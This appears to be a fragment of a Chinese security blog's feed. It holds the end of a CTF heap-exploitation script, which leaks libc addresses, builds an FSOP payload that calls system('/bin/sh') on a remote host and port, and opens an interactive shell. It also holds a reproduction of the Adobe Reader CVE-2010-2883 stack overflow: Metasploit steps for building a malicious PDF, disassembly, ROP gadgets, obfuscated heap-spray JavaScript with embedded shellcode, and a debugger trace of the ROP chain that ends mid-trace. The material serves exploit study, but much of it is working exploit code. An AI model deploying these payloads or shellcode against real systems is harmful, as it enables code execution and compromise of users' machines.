class="string">&#x27;47.108.195.119&#x27;</span>,<span class="number">20141</span>)</span><br><span class="line">sla(<span class="string">&quot;:\x1b[0m\n&quot;</span>, <span class="string">&#x27;SCA&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;:\x1b[0m\n&quot;</span>, <span class="string">&#x27;Jun&#x27;</span>)</span><br><span class="line"><span class="comment"># sleep(0.5)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, name=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">sla(<span class="string">&quot;Your choice : &quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;it\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">sla(<span class="string">&quot;ame?&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">size,name</span>):</span></span><br><span class="line">sla(<span class="string">&quot;Your choice : &quot;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;it\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">sla(<span class="string">&quot;ame&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">sla(<span class="string">&quot;Your choice : &quot;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chunk0 = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&#x27;chunk0&#x27;</span>, chunk0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#此时0xfb1+0x55d2430ed050 = 0x55d2430ee000 满足页对齐</span></span><br><span class="line">edit(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xfb1</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xff8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">show()</span><br><span class="line">main_arena = l64() - <span class="number">1640</span></span><br><span class="line">libc_base = main_arena - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">IOlist = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;main_arena&#x27;</span>, main_arena)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">lg(<span class="string">&#x27;IOlist&#x27;</span>, IOlist)</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式1 </span></span><br><span class="line"><span class="comment"># payload = &#x27;a&#x27;*0x20 + &quot;/bin/sh\x00&quot;</span></span><br><span class="line"><span class="comment"># payload += p64(0x61)</span></span><br><span class="line"><span class="comment"># payload += p64(0) + p64(IOlist-0x10) </span></span><br><span class="line"><span class="comment"># payload += p64(0) + p64(1)  # write_ptr &gt; write_base</span></span><br><span class="line"><span class="comment"># payload = payload.ljust(0xc0+0x20,&quot;\x00&quot;)</span></span><br><span class="line"><span class="comment"># payload += p64(0) * 3</span></span><br><span class="line"><span class="comment"># payload += p64(chunk0 + 0x148) # vtable </span></span><br><span class="line"><span class="comment"># payload += p64(0) * 2</span></span><br><span class="line"><span class="comment"># payload += p64(system) </span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式2</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload += p64(<span class="number">0x61</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(IOlist-<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span> + <span class="number">0x20</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(chunk0 + <span class="number">0x70</span> + <span class="number">0xc8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">1</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(chunk0 + <span class="number">0x70</span> + <span class="number">0xd8</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="built_in">len</span>(payload), payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">sla(<span class="string">&quot;Your choice : &quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;it\n&quot;</span>, <span class="string">&#x27;300&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;x/10gx $rebase(0x00000000002020A0)&quot;)</span></span><br><span class="line"><span class="comment"># p *((struct _IO_FILE*)0x561272648148)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-ezstack&quot;&gt;&lt;a href=&quot;#0x00-ezstack&quot; class=&quot;headerlink&quot; title=&quot;0x00 ezstack&quot;&gt;&lt;/a&gt;0x00 ezstack&lt;/h1&gt;&lt;p&gt;格式化字符串泄露carry、libc_start_main、</summary>
      
    
    
    
    <category term="CTF" scheme="https://adam-01.github.io/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://adam-01.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2010-2883 Adobe Reader栈溢出复现</title>
    <link href="https://adam-01.github.io/2021/11/20/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/"/>
    <id>https://adam-01.github.io/2021/11/20/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-11-20T04:32:58.000Z</published>
    <updated>2021-11-20T09:45:24.063Z</updated>
    
    <content type="html"><![CDATA[<p>给自己开个大坑，准备开始跟着泉哥的漏斗战争复现漏洞。今天开始第一个，还是能学到了不少知识。</p><h1 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h1><blockquote><p>Windows 7 (虚拟机)</p><p>IDA 7.6 + OllyDbg</p><p>Adobe Reader 9</p><p>PDFStreamDumper</p></blockquote><p><a href="https://pan.baidu.com/s/1OoNxdynBCmxnZ2p8536wUQ">Adobe Reader 9</a>  提取码20v0</p><p><a href="http://sandsprite.com/blogs/index.php?uid=7&amp;amp;pid=57">PDFStreamDumper</a></p><h1 id="0x02-漏洞触发点"><a href="#0x02-漏洞触发点" class="headerlink" title="0x02 漏洞触发点"></a>0x02 漏洞触发点</h1><p>在CoolType.dll中在解析SING表时使用了<code>strcat()</code>，并且没有限制大小。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DAEF ; __unwind &#123; // loc_818436D</span><br><span class="line">.text:0803DAEF                 push    ebp</span><br><span class="line">.text:0803DAF0                 sub     esp, 104h</span><br><span class="line">.text:0803DAF6                 lea     ebp, [esp-4]</span><br><span class="line">.text:0803DAFA                 mov     eax, ___security_cookie</span><br><span class="line">.text:0803DAFF                 xor     eax, ebp</span><br><span class="line">.text:0803DB01                 mov     [ebp+108h+var_4], eax</span><br><span class="line">.text:0803DB07                 push    4Ch</span><br><span class="line">.text:0803DB09                 mov     eax, offset loc_818436D</span><br><span class="line">.text:0803DB0E                 call    __EH_prolog3_catch</span><br><span class="line">.text:0803DB13                 mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DB19                 mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DB1F                 mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DB25                 mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DB28                 mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DB2B                 call    sub_804150F</span><br><span class="line">.text:0803DB30                 xor     esi, esi</span><br><span class="line">.text:0803DB32                 cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DB36 ;   try &#123;</span><br><span class="line">.text:0803DB36                 mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DB39                 jz      loc_803DCF6</span><br><span class="line">.text:0803DB3F                 mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DB42                 mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DB45                 cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DB45 ;   &#125; // starts at 803DB36</span><br><span class="line">.text:0803DB49 ;   try &#123;</span><br><span class="line">.text:0803DB49                 mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DB4D                 jnz     loc_803DC9F</span><br><span class="line">.text:0803DB53                 push    offset aName    ; &quot;name&quot;</span><br><span class="line">.text:0803DB58                 push    edi             ; int</span><br><span class="line">.text:0803DB59                 lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DB5C                 mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DB60                 call    sub_80216F4</span><br><span class="line">.text:0803DB65                 cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DB68                 jnz     short loc_803DBD3</span><br><span class="line">.text:0803DB6A                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DB6F                 push    edi             ; int</span><br><span class="line">.text:0803DB70                 lea     ecx, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DB73                 call    sub_8021A23</span><br><span class="line">.text:0803DB78                 mov     eax, [ebp+108h+var_12C]；--&gt;此时eax为SING表的地址</span><br><span class="line">.text:0803DB7B                 cmp     eax, esi</span><br><span class="line">.text:0803DB7B ;   &#125; // starts at 803DB49</span><br><span class="line">.text:0803DB7D ;   try &#123;</span><br><span class="line">.text:0803DB7D                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DB81                 jz      short loc_803DBBA</span><br><span class="line">.text:0803DB83                 mov     ecx, [eax]</span><br><span class="line">.text:0803DB85                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DB8B                 jz      short loc_803DB95</span><br><span class="line">.text:0803DB8D                 cmp     ecx, 100h</span><br><span class="line">.text:0803DB93                 jnz     short loc_803DBB6</span><br><span class="line">.text:0803DB95</span><br><span class="line">.text:0803DB95 loc_803DB95:                            ; CODE XREF: sub_803DAEF+9C↑j</span><br><span class="line">.text:0803DB95                 add     eax, 10h        ；-----------&gt;定位到uniquename</span><br><span class="line">.text:0803DB98                 push    eax             ; Source</span><br><span class="line">.text:0803DB99                 lea     eax, [ebp+108h+Destination]</span><br><span class="line">.text:0803DB9C                 push    eax             ; Destination</span><br><span class="line">.text:0803DB9D                 mov     [ebp+108h+Destination], 0</span><br><span class="line">.text:0803DBA1                 call    strcat          ；-----------&gt;溢出</span><br></pre></td></tr></table></figure><h1 id="0x03-使用msf构造恶意文件"><a href="#0x03-使用msf构造恶意文件" class="headerlink" title="0x03 使用msf构造恶意文件"></a>0x03 使用msf构造恶意文件</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt;  search cve-2010-2883</span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                            Disclosure Date  Rank   Check  Description</span></span><br><span class="line">   -  ----                                            ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/browser/adobe_cooltype_sing     2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">   1  exploit/windows/fileformat/adobe_cooltype_sing  2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">msf5 &gt; use exploit/windows/fileformat/adobe_cooltype_sing</span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set payload windows/exec</span><br><span class="line">payload =&gt; windows/exec</span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set cmd calc.exe</span><br><span class="line">cmd =&gt; calc.exe</span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; run</span><br><span class="line">[*] Creating &#x27;msf.pdf&#x27; file...</span><br><span class="line">[+] msf.pdf stored at /root/.msf4/local/msf.pdf</span><br></pre></td></tr></table></figure><h1 id="0x04-分析恶意文件"><a href="#0x04-分析恶意文件" class="headerlink" title="0x04 分析恶意文件"></a>0x04 分析恶意文件</h1><p>使用PDFsteamDumper分析恶意文件，找到TTF中关于TableEntry结构的数据。</p><p>TableEntry数据结构为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> sturct_SING&#123;</span><br><span class="line"><span class="keyword">char</span> tag[<span class="number">4</span>];</span><br><span class="line">    ULONG checkSum;</span><br><span class="line">    ULONG offset;</span><br><span class="line">    ULONG length;</span><br><span class="line">&#125;TableEntry;</span><br></pre></td></tr></table></figure><p>可知第三字节为相对文件偏移，<code>0x11c</code>。所以SING数据开始为<code>0x11c</code>。根据SING表的数据结构得知，SING偏移<code>0x10</code>处为uniquename，即<code>0x12c</code>。</p><p><img src="https://i.loli.net/2021/11/20/obfVRtQ38vi71FI.png" alt="1637394454732"></p><p>在执行完strcat时，是将0x12c处起始的数据复制到ebp的地址中。直到遇到<code>\x00</code>截止。所以造成了栈溢出。使用OD打开Adobe Reader，F9运行后就加载了CoolType.dll。在dll里面找到strcat函数下好断点。</p><p><img src="https://i.loli.net/2021/11/20/kF3LKgDW8S1BH4v.png" alt="1637396740309"></p><p>找<code>strcat</code>可以使用搜索<code>SING</code>字符串的方式然后定位到<code>strcat()</code>，也可以用偏移的方式计算<code>strcat</code>的地址，比如IDA开始的地址为<code>0x08001000</code>，<code>strcat</code>地址为<code>0x0803DBA1</code>，OD中进入时的地址为<code>0x6D4A1000</code>，那么<code>strcat</code>的地址为<code>0x6D4A1000-0x08001000+0x0803DBA1=0x6d4ddba1</code>。在此时下好断点，然后打开恶意文件，会自动断到此处。</p><p><img src="https://i.loli.net/2021/11/20/enEkGtNxCA8dmQw.png" alt="1637395611478"></p><p>可以看到此时<code>strcat</code>的源操作数，正是PDF中uniquename的数据。F8单步步过strcat函数，可以看到从ebp后的数据全部被uniquename覆盖。</p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>在uniquename数据中有关键的两个跳转地址，在这两个地址处下内存访问断点</p><p><img src="https://i.loli.net/2021/11/20/1qjOgH4l7ocdEaw.png" alt=""></p><p>继续运行到<code>0x0801BA5C</code>(IDA中的地址)处,实际地址可以使用上面计算strcat地址方法.</p><p><code>call    dword ptr [eax]</code></p><p>F7进入这个call, 然后F8单步运行到下一个<code>call    dword ptr [eax]</code>时,此时<code>eax=0x2FE1E0</code>,<code>[eax]=0x4A80CB38</code>.这个地址为icucnv36,dll的地址.</p><p><img src="https://i.loli.net/2021/11/20/qQkzFwjBfG2ibun.png" alt="1637394020539"></p><p>继续运行,</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4A80CB38    81C5 94070000   add ebp,0x794</span><br><span class="line">4A80CB3E    C9              leave</span><br><span class="line">4A80CB3F    C3              retn</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4A82A714    5C              pop esp                              ; 0C0C0C0C</span><br><span class="line">4A82A715    C3              retn</span><br></pre></td></tr></table></figure><p>运行到这里时,栈顶esp变成<code>0x0C0C0C0C</code>, 恶意文件通过js实现了堆喷射,将会跳转到shellcode去执行.shellcode在pdfstreamdumper中的object可以看到.时经过混淆后的js代码.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> FrKEiGdVmIfWirvvYTIA = <span class="built_in">unescape</span>;</span><br><span class="line"><span class="keyword">var</span> xLwAFCEdZswVQCIKtsRgaVPHWJzBExoSmAWixUMyqBsaItoEXTsAOIL = FrKEiGdVmIfWirvvYTIA( <span class="string">&#x27;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u8abf%ucb85%uda3e%ud9ce%u2474%u5ef4%uc929%u31b1%uee83%u31fc%u0f7e%u7e03%u6785%uc23e%ue571%u3bc1%u8a81%ude48%u8ab0%uaa2f%u3ae2%ufe3b%ub00e%ueb69%ub485%u1ca5%u722e%u1390%u2faf%u32e0%u3233%u9535%ufd0a%ud448%ue04b%u84a1%u6e04%u3917%u3a21%ub2a4%uaa79%u27ac%ucdc9%uf99d%u9442%ufb3d%uac87%ue377%u89c4%u98ce%u653e%u48d1%u860f%ub57e%u75a0%uf17e%u6606%u0bf5%u1b75%uc80e%uc704%ucb9b%u8cae%u303c%u404f%ub3da%u2d43%u9ca8%ub047%u977d%u3973%u7880%u79f2%u5ca7%ud95f%uc5c6%u8c05%u16f7%u71e6%u5c52%u650a%u3fef%u7840%u3a7d%u7a26%u457d%u1316%uce4c%u64f9%u0551%u9bbe%u041b%u3396%udcc2%u59ab%u0af5%u67ef%ubf76%u938f%uca66%ud88a%u2620%u71e6%u48c5%u7155%u2acc%ue138%u828c%u81df%udb37&#x27;</span> );</span><br><span class="line"><span class="keyword">var</span> hkiUgpUvDxMNXFQeYvCTmlEWkbbHYrxIwBUZrBNUxMKnxBOxICoihopTUecetbXvtCruJNUXtffCKpQBsmcUUrOUgyH = FrKEiGdVmIfWirvvYTIA( <span class="string">&quot;%&quot;</span> + <span class="string">&quot;u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> );</span><br><span class="line"><span class="keyword">while</span> (hkiUgpUvDxMNXFQeYvCTmlEWkbbHYrxIwBUZrBNUxMKnxBOxICoihopTUecetbXvtCruJNUXtffCKpQBsmcUUrOUgyH.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) hkiUgpUvDxMNXFQeYvCTmlEWkbbHYrxIwBUZrBNUxMKnxBOxICoihopTUecetbXvtCruJNUXtffCKpQBsmcUUrOUgyH+=hkiUgpUvDxMNXFQeYvCTmlEWkbbHYrxIwBUZrBNUxMKnxBOxICoihopTUecetbXvtCruJNUXtffCKpQBsmcUUrOUgyH;</span><br><span class="line">NLdPxPqExhtqHUjXtRfZGNOvkhxUyeqbSWuAgTTGPBd = hkiUgpUvDxMNXFQeYvCTmlEWkbbHYrxIwBUZrBNUxMKnxBOxICoihopTUecetbXvtCruJNUXtffCKpQBsmcUUrOUgyH.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span>-<span class="number">0x24</span>)/<span class="number">2</span>);</span><br><span class="line">NLdPxPqExhtqHUjXtRfZGNOvkhxUyeqbSWuAgTTGPBd += xLwAFCEdZswVQCIKtsRgaVPHWJzBExoSmAWixUMyqBsaItoEXTsAOIL;</span><br><span class="line">NLdPxPqExhtqHUjXtRfZGNOvkhxUyeqbSWuAgTTGPBd += hkiUgpUvDxMNXFQeYvCTmlEWkbbHYrxIwBUZrBNUxMKnxBOxICoihopTUecetbXvtCruJNUXtffCKpQBsmcUUrOUgyH;</span><br><span class="line">pYiqzhhOnHJBuRUiJoVedMKeOlFAEcRJwLUsnANrWkFGRoSavVkKLdZUOvBMfwIobnzOWfoSIMlAVvCAoCl = NLdPxPqExhtqHUjXtRfZGNOvkhxUyeqbSWuAgTTGPBd.substring(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(pYiqzhhOnHJBuRUiJoVedMKeOlFAEcRJwLUsnANrWkFGRoSavVkKLdZUOvBMfwIobnzOWfoSIMlAVvCAoCl.length &lt; <span class="number">0x80000</span>) pYiqzhhOnHJBuRUiJoVedMKeOlFAEcRJwLUsnANrWkFGRoSavVkKLdZUOvBMfwIobnzOWfoSIMlAVvCAoCl += pYiqzhhOnHJBuRUiJoVedMKeOlFAEcRJwLUsnANrWkFGRoSavVkKLdZUOvBMfwIobnzOWfoSIMlAVvCAoCl;</span><br><span class="line">IxFNldqccqIArsXZFHNeFymCYIojCOn = pYiqzhhOnHJBuRUiJoVedMKeOlFAEcRJwLUsnANrWkFGRoSavVkKLdZUOvBMfwIobnzOWfoSIMlAVvCAoCl.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span>-<span class="number">0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> nJpUysqyPgZFSLaaZnduTBYzAYsbgNPbaTZRGCZQuQWdoVSMndHmbuKIQDGEKMjFcNFWJocRzDIYLBBHVvmTRHORIhkavyzY = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (xhhPSzGEaXEHboGMEQyRXKPtfbAoqfgEiLThXYsY=<span class="number">0</span>;xhhPSzGEaXEHboGMEQyRXKPtfbAoqfgEiLThXYsY&lt;<span class="number">0x1f0</span>;xhhPSzGEaXEHboGMEQyRXKPtfbAoqfgEiLThXYsY++) nJpUysqyPgZFSLaaZnduTBYzAYsbgNPbaTZRGCZQuQWdoVSMndHmbuKIQDGEKMjFcNFWJocRzDIYLBBHVvmTRHORIhkavyzY[xhhPSzGEaXEHboGMEQyRXKPtfbAoqfgEiLThXYsY]=IxFNldqccqIArsXZFHNeFymCYIojCOn+<span class="string">&quot;s&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>shellcode又继续构造了ROP链,此时栈数据如下,就是shellcode的内容.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0C0C0C08   41414141</span><br><span class="line">0C0C0C0C   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0C10   4A8A0000  icucnv36.4A8A0000</span><br><span class="line">0C0C0C14   4A802196  icucnv36.4A802196</span><br><span class="line">0C0C0C18   4A801F90  icucnv36.4A801F90</span><br><span class="line">0C0C0C1C   4A84903C  &lt;&amp;KERNEL32.CreateFileA&gt;</span><br><span class="line">0C0C0C20   4A80B692  icucnv36.4A80B692</span><br><span class="line">0C0C0C24   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0C28   4A8522C8  icucnv36.4A8522C8</span><br><span class="line">0C0C0C2C   10000000  offset RdLang32.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0C0C0C30   00000000</span><br></pre></td></tr></table></figure><p>继续执行到CreateFileA,创建了一个iso88591文件.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0C0C0C24   4A801064  /CALL 到 CreateFileA</span><br><span class="line">0C0C0C28   4A8522C8  |FileName = &quot;iso88591&quot;</span><br><span class="line">0C0C0C2C   10000000  |Access = GENERIC_ALL</span><br><span class="line">0C0C0C30   00000000  |ShareMode = 0</span><br><span class="line">0C0C0C34   00000000  |pSecurity = NULL</span><br><span class="line">0C0C0C38   00000002  |Mode = CREATE_ALWAYS</span><br><span class="line">0C0C0C3C   00000102  |Attributes = HIDDEN|TEMPORARY</span><br><span class="line">0C0C0C40   00000000  \hTemplateFile = NULL</span><br></pre></td></tr></table></figure><p>相同的手法去构造CreateFileMappingA MapViewOfFile  memcpy</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0C0C0C68   4A801064  /CALL 到 CreateFileMappingA</span><br><span class="line">0C0C0C6C   000004DC  |hFile = 000004DC</span><br><span class="line">0C0C0C70   00000000  |pSecurity = NULL</span><br><span class="line">0C0C0C74   00000040  |Protection = PAGE_EXECUTE_READWRITE</span><br><span class="line">0C0C0C78   00000000  |MaximumSizeHigh = 0x0</span><br><span class="line">0C0C0C7C   00010000  |MaximumSizeLow = 0x10000</span><br><span class="line">0C0C0C80   00000000  \MapName = NULL</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0C0C0CA8   4A801064  /CALL 到 MapViewOfFile</span><br><span class="line">0C0C0CAC   000004E0  |hMapObject = 000004E0</span><br><span class="line">0C0C0CB0   00000022  |AccessMode = 0x22</span><br><span class="line">0C0C0CB4   00000000  |OffsetHigh = 0x0</span><br><span 